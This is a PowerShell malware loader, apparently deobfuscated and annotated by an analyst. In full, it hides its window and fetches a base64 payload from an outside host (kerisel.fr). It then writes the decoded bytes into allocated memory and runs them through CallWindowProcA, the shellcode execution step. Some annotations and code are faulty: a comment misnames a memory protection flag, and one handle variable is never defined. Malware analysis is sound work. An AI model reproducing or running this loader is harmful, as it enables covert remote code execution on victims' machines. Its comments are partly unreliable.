# Define paths and environment details
$powershell_path = $env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
$command_line_args = ((Get-WmiObject win32_process -Filter "ProcessId=$PID").CommandLine) -split '"'
$script_argument = $command_line_args[$command_line_args.Length - 2]
$is_64bit = ([IntPtr]::Size -eq 8)

# Adjust PowerShell path for 32-bit systems
if (-not $is_64bit) {
    $powershell_path = "powershell.exe"
}

$is_valid_context = ($odontoclast -or $is_64bit)  # $odontoclast likely from stage 0 (malware_obfuscated.txt)
$user_profile = $env:userprofile

# If running in a valid context, launch a new PowerShell process
if ($is_valid_context) {
    $quoted_argument = '"' + $script_argument + '"'
    while (-not $shell_application) {
        $shell_type = [Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")  # CLSID for Shell.Application
        $shell_instance = [System.Activator]::CreateInstance($shell_type)
        $shell_application = $shell_instance.Item()
        if (-not $shell_application) {
            $placeholder = ''
            $shell_application = $shell_instance.Item(0)
        }
        if (-not $shell_application) {
            Start-Process "explorer.exe"
            Start-Sleep 1
        }
    }
    # Launch PowerShell with the provided argument in the user's profile directory
    $shell_application.Document.Application.ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0)
    exit
}

# Function to get a function pointer from a DLL
function Get-FunctionPointer {
    param (
        [string]$dll_name,
        [string]$function_name
    )
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    $kernel32_module = $kernel32_handle.GetMethod("GetModuleHandle").Invoke($null, @($dll_name))
    $method = $kernel32_handle.GetMethod("GetProcAddress", [Type[]] @("System.Runtime.InteropServices.HandleRef", "string"))
    return $method.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kernel32_module)), $function_name))
}

# Function to create a delegate for a native function
function Create-Delegate {
    param (
        [Parameter(Position = 0)] [Type[]]$parameter_types,
        [Parameter(Position = 1)] [Type]$return_type = [Void]
    )
    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), "Run")
    $module = $assembly.DefineDynamicModule("InMemoryModule", $false)
    $delegate_type = $module.DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
    $method = $delegate_type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $return_type, $parameter_types)
    $method.SetImplementationFlags("Runtime, Managed")
    return $delegate_type.CreateType()
}

# Download and decode payload
$download_path = 'Opsamlingscirkulrerne.Oxy'
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$web_client = New-Object System.Net.WebClient
$web_client.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/14.0'
$payload_url = "http://kerisel.fr/js/Ovenanfrt.mix"
$web_client.DownloadFile($payload_url, $download_path)
$downloaded_data = Get-Content $download_path
$payload_bytes = [System.Convert]::FromBase64String($downloaded_data)

# Initialize variables
$zero = 0
$window_title = 'dyreklasser'

# Set console window title
$Host.UI.RawUI.WindowTitle = $window_title

# Find process with matching window title
$target_process = (Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title })
$window_handle = $target_process.MainWindowHandle

# Hide the target window
$show_window_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "user32" "ShowWindow"),
    (Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]))
)
$show_window_delegate.Invoke($window_handle, $zero)

# Memory allocation and protection
$virtual_alloc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "kernel32" "VirtualAlloc"),
    (Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
)
$protect_memory_delegate = Get-FunctionPointer "ntdll" "NtProtectVirtualMemory"

$allocation_size1 = 12288  # 14580 - 2292
$allocation_size2 = 4      # -19949 + 20013
$protection_flag = 4       # -53923 + 53927 (PAGE_EXECUTE_READWRITE)

# Allocate memory
$memory_region1 = $virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag)
$memory_region2 = $virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag)

# Copy payload to memory
[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974)
[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974))

# Execute payload as a window procedure
$call_window_proc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "USER32" "CallWindowProcA"),
    (Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]))
)
$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero)